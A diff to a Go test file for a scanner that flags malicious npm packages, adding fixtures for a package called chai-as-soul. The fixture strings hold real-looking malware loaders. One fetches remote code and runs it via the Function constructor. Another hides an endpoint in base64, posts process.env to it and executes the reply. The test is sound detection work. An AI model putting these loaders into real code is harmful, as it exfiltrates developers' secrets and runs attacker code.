@@ -1681,8 +1681,8 @@ chmodSync(target, 0o755);`)
 }
 
 // TestScan_AmazonInspectorLatestCriticalNPMArtifactsUnderNodeModules proves the
-// bounded walker reaches expect-dotenv, @httttt/mcp-demo, mcp-dev-toolkit, and
-// express-session-handler under npm and pnpm.
+// bounded walker reaches expect-dotenv, @httttt/mcp-demo, mcp-dev-toolkit,
+// express-session-handler, and chai-as-soul under npm and pnpm.
 func TestScan_AmazonInspectorLatestCriticalNPMArtifactsUnderNodeModules(t *testing.T) {
 	tests := []struct {
 		name string
@@ -1728,6 +1728,16 @@ func TestScan_AmazonInspectorLatestCriticalNPMArtifactsUnderNodeModules(t *testi
 			name: "express session handler pnpm",
 			rel:  filepath.Join("node_modules", ".pnpm", "express-session-handler@2.3.3", "node_modules", "express-session-handler", "index.js"),
 			raw:  []byte(`async function initPlugin() { const response = await fetch("https://api.jsonbin.io/v3/b/6a4f5816f5f4af5e29762c92"); const plugin = response.record.cerookie; Function.constructor("require", plugin)(require); } initPlugin();`),
+		},
+		{
+			name: "chai as soul npm",
+			rel:  filepath.Join("node_modules", "chai-as-soul", "lib", "initializeCaller.js"),
+			raw:  []byte(`(async () => { const configEndpoint = Buffer.from("aHR0cHM6Ly9pcGNoZWNrLWhhc2hlZC52ZXJjZWwuYXBwL2FwaS9hdXRoLzZjMWQ2MGQzNTg1MmVmMGMwNWRm", "base64").toString(); const response = await axios.post(configEndpoint, process.env, { headers: { "x-secret-header": "campaign" } }); new Function("require", response.data)(require); })();`),
+		},
+		{
+			name: "chai as soul pnpm",
+			rel:  filepath.Join("node_modules", ".pnpm", "chai-as-soul@2.3.5", "node_modules", "chai-as-soul", "lib", "initializeCaller.js"),
+			raw:  []byte(`(async () => { const configEndpoint = Buffer.from("aHR0cHM6Ly9pcGNoZWNrLWhhc2hlZC52ZXJjZWwuYXBwL2FwaS9hdXRoLzZjMWQ2MGQzNTg1MmVmMGMwNWRm", "base64").toString(); const response = await axios.post(configEndpoint, process.env, { headers: { "x-secret-header": "campaign" } }); new Function("require", response.data)(require); })();`),
 		},
 	}
 	for _, tc := range tests {
